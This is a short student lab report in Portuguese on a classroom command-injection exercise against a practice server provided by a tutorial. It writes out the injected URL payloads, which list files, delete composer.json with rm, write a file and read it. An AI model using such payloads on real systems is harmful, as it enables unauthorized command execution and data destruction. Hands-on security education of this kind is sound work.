# Relatório: Prática de Command Injection

Durante a apresentação em sala do conceito de command injection como um ataque de executando comandos no sistema operacional do servidor, no mesmo tutorial, foram propostas duas atividades práticas.

Realizando um ataque no servidor vulnerável disponibilizado pelo tutoral:
 http://commandinjection.herokuapp.com/

A partir das atividades propostas pela prática: 

Listei os arquivos do diretório:
> http://commandinjection.herokuapp.com/?dir=;ls

Apaguei um dos arquivos dentro da pasta /files
>http://commandinjection.herokuapp.com/?dir=files;rm%20composer.json

Criei um arquivo com o nome davicedraz.txt dentro da pasta /folder

> http://commandinjection.herokuapp.com/?dir=folder;echo "atividade_pratica" > davicedraz.txt

Escolhi um diretório qualquer na raiz do servidor e listar seu conteúdo.

>http://commandinjection.herokuapp.com/?dir=files;cat davicedraz.txt

![SQL](listar_arquivo.jpg)

No geral, não tive dificuldades para executar as atividades propostas e achei o tutorial muito interessante. O mesmo pode ser aplicado a outros servidores com vulnerabilidades a serem exploradas por command injection.